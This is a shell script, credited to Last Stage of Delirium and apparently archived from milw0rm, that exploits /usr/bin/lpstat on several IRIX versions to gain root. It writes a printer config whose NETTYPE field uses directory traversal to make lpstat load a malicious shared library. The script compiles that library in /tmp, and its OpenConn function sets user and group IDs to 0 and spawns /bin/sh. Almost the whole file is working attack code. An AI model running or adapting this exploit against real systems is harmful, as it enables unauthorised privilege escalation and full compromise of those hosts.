#!/bin/sh
## copyright LAST STAGE OF DELIRIUM jul 2000 poland            *://lsd-pl.net/ #
## /usr/bin/lpstat                                                             #

EXECUTABLE=/usr/bin/lpstat
FILE=file
LIBRARY=lsd
DIRECTORY=tmp

cd $DIRECTORY
cat > $FILE << 'EOF'
HOSTNAME=localhost
HOSTPRINTER=bzzz-z
EOF
echo NETTYPE=../../../../$DIRECTORY/lsd >> $FILE
chmod 666 $FILE
cat > $LIBRARY.c << 'EOF'
OpenConn(){
    printf("copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\n");
    printf("/usr/bin/lpstat for irix 5.3 6.2 6.3 6.4 6.5 6.5.11 IP:all\n");
    printf("\n");
    setreuid(getuid(),0);setuid(0);setgid(0);
    execl("/bin/sh","sh",0);
}
CloseConn(){} ListPrinters(){} SendJob(){} CancelJob(){} WaitForJob(){}
GetQueue(){} StartTagging(){} StopTagging(){} Install(){} AddTimeout(){}
RemoveSemiColons(){} CreateInterface(){} InstallPrinter(){}
InstallIcon(){} SockRead(){} IsDest(){} BSDSendJob(){} ListAllPrinters(){}
EOF
cc -c $LIBRARY.c -c -o $LIBRARY.o
ld -shared $LIBRARY.o -o $LIBRARY.so
rm -rf $LIBRARY.[co] so_locations
if [ ! -f "$LIBRARY.so" ]
    then
    echo "error: building library"
    exit 1
fi
chmod 666 $LIBRARY.so

$EXECUTABLE -n ../../../../../$DIRECTORY/$FILE

# milw0rm.com [2001-05-07]
